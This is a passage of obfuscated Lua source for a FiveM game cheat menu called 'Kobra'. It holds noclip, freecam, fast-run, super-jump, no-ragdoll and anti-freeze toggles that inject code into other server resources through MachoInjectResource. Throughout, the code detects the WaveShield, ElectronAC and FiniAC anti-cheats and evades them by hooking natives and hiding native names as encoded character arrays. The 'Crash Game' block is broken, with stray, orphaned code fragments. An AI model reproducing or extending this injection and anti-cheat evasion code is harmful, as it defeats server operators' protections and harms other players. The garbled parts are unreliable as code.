                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipSpeed = ]]   .. v371   .. [[
                                end
                            ]] );elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(2 + 1 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v371   .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.KobraNoclipSpeed or ]]   .. v371   .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v371   .. [[
                                            end
                                        ]] );else MachoInjectResource2(1304 -(384 + 917) ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipSpeed = ]]   .. v371   .. [[
                                            if not _G.KobraNoclipThreadRunning then
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.KobraNoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.KobraNoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.KobraNoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipSpeed = ]]   .. v371   .. [[
                                            end
                                        ]] );end break;end end elseif (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                    _G.KobraNoclipEnabled = false
                                    _G.KobraNoclipThreadRunning = false
                                ]]);elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(700 -(128 + 569) ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipEnabled = false
                                            _G.KobraNoclipThreadRunning = false
                                        ]]);end end},{type="slider-checkbox",label="Freecam",scrollType="onScroll",checked=false,value=1887.25 -(687 + 1200) ,step=1710.25 -(556 + 1154) ,min=0.25 -0 ,max=100 -(9 + 86) ,onSelect=function(v373,v374) v268:ToggleFreecam(v374,v373);end},{type="checkbox",label="Fast Run",checked=false,onSelect=function(v375) if v375 then v12:Notify("success","Kobra","Fast Run On",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]);end else local v625=0;while true do if (v625==(0 + 0)) then v12:Notify("error","Kobra","Fast Run Off",3064 -(29 + 35) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]]);end break;end end end end},{type="checkbox",label="Super Jump",checked=false,onSelect=function(v376) local v377=GetResourceState("WaveShield")=="started" ;local function v378(v565) local v566="";for v626=4 -3 , #v565 do v566=v566   .. string.char(v565[v626]) ;end return v566;end local function v379(v567) return _G[v378(v567)];end local function v380() if  not _G.superJumpEnabled then local v721=0;while true do if (v721==(0 -0)) then _G.superJumpEnabled=true;v379({295 -228 ,114,1113 -(53 + 959) ,505 -(312 + 96) ,116,175 -74 ,84,1003 -(813 + 86) ,114,101,97,34 + 66 })(function() while _G.superJumpEnabled do local v1011=0 -0 ;while true do if (v1011==(1086 -(860 + 226))) then v379({11 + 72 ,12 + 89 ,116,83,117,112,153 -(51 + 1) ,243 -129 ,21 + 53 ,117,47 + 62 ,112,84,104,105,22 + 93 ,59 + 11 ,114,1601 -(504 + 1000) ,109,101})(v379({73 + 7 ,108,97,71 + 50 ,283 -(156 + 26) ,66 + 48 ,113 -40 ,100})());Wait(960 -(890 + 70) );break;end end end end);break;end end end end local function v381() local v568=117 -(39 + 78) ;while true do if ((482 -(14 + 468))==v568) then _G.superJumpEnabled=false;v379({231 -148 ,61 + 40 ,53 + 63 ,83,116 + 1 ,3 + 109 ,101,114,125 -(12 + 39) ,117,109,112,84,104,266 -161 ,555 -440 ,70,114,810 -(164 + 549) ,134 -25 ,18 + 83 })(v379({472 -(145 + 247) ,50 + 58 ,97,24 + 97 ,163 -62 ,114,633 -(544 + 16) ,728 -(294 + 334) })(),1);break;end end end if v376 then if v377 then v380();else MachoInjectResourceRaw("any",[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]]);end elseif v377 then local v778=253 -(236 + 17) ;while true do if (v778==(0 + 0)) then print("off");v381();break;end end else MachoInjectResourceRaw("any",[[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]]);end end}}},{label="Miscellaneous",tabs={{icon="",type="button",label="Crash Game",desc="Crashes your game",onSelect=function() MachoInjectResourceRaw("any",[[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]]);end},{icon="",type="button",label="Clear Screen Effects",desc="Removes all screen effects",onSelect=function() print("Revive");end},{icon="",type="button",label="Suicide",desc="This will kill you.",onSelect=function() local v382=0;local v383;while true do if (v382==(0 -0)) then v383=nil;function v383() local v779=SetEntityHealth;v779(PlayerPedId(),0);end v382=1;end if (v382==1) then v383();break;end end end},{icon="",type="button",label="Force Ragdoll",desc="This will ragdoll.",onSelect=function() MachoInjectResourceRaw("any",[[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]]);end},{icon="",type="button",label="Remove Crutch",desc="Remove Crutch is the server is using the correct resource",onSelect=function() MachoResourceStop("wasabi_crutch");end},{icon="",type="scrollable",value=795 -(413 + 381) ,values={"Primary","Secondary"},label="Clear Tasks",desc="Clears the character's tasks",onSelect=function(v384) if (v384=="Primary") then ClearPedTasksImmediately(PlayerPedId());elseif (v384=="Secondary") then ClearPedSecondaryTask(PlayerPedId());end end},{type="divider",label="Toggles"},{type="checkbox",label="No Ragdoll",checked=false,desc="This will prevent you from being ragdolled from admins or cheaters.",onSelect=function(v385) local v386=0 -0 ;local v387;local v388;while true do if (v386==(2 -1)) then if v385 then if v387 then local v971=0;while true do if (v971==(1970 -(582 + 1388))) then v12:Notify("success","Kobra","No Ragdoll Enabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]]);break;end end else v48(v388,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Enabled (Fallback)",5111 -2111 );end elseif v387 then v12:Notify("success","Kobra","No Ragdoll Disabled",2148 + 852 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            noRagdollEnabled = false
                                        ]]);else local v972=364 -(326 + 38) ;while true do if (v972==(0 -0)) then v48(v388,[[
                                            noRagdollEnabled = false
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Disabled (Fallback)",4282 -1282 );break;end end end break;end if (v386==0) then v387=GetResourceState("WaveShield")=="started" ;v388=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v386=621 -(47 + 573) ;end end end},{type="checkbox",label="Anti-Freeze",checked=false,desc="This will prevent you from being frozen.",onSelect=function(v389) local v390=0 + 0 ;local v391;local v392;while true do if (v390==1) then if v389 then if v391 then v12:Notify("success","Kobra","Anti-Freeze Enabled",12741 -9741 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]]);else local v973=0 -0 ;while true do if (v973==(1664 -(1269 + 395))) then v48(v392,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]]);v12:Notify("success","Kobra","Anti-Freeze Enabled (Fallback)",3492 -(76 + 416) );break;end end end elseif v391 then v12:Notify("error","Kobra","Anti-Freeze Disabled",3443 -(319 + 124) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            antiFreezeEnabled = false
                                        ]]);else local v974=0;while true do if (v974==(0 -0)) then v48(v392,[[
                                            antiFreezeEnabled = false
                                        ]]);v12:Notify("error","Kobra","Anti-Freeze Disabled (Fallback)",4007 -(564 + 443) );break;end end end break;end if (v390==0) then v391=GetResourceState("WaveShield")=="started" ;v392=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v390=1;end end end},{type="checkbox",label="Force Third Person",checked=false,desc="This will force third person.",onSelect=function(v393) if v393 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
